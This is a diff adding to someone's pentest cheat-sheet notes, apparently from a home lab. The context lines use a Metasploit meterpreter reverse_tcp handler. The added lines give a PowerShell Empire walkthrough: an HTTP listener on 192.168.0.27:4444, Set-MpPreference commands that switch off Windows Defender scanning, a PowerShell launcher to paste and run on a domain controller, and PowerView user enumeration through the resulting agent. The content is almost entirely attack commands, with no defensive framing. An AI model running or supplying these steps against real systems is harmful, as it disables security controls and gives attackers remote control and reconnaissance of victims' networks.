@@ -98,6 +98,8 @@ restart Win 7
 then msf -> msf6 exploit(multi/handler) 
 payload => windows/meterpreter/reverse_tcp > run
 
+
+---------------------------------------------------------------
 POWERSHeLL eMPIRe -- Post-Exploitation Framework
 
 cd /opt
@@ -106,4 +108,26 @@ cd setup
 ./install.sh
 cd ..
 ./empire
+
+Windows Domain Controller - target
+uselistener http
+info
+set Host http://192.168.0.27:4444
+execute
+
+(Win powershell -> Set-MpPreference -DisableRealTimeMonitoring $true)
+(Win powershell -> Set-MpPreference -DisableArchive Scanning $true)
+
+(Empire: listeners) > uselistener http
+(Empire: listeners/http) > launcher powershell
+
+** copy script and RUN in the powershell of target
+empire ENTER
+agents
+rename DVNHU SRV2016
+> interact SRV2016
+> info
+
+usemodule situational_awareness/network/powerview/get_user
+
 
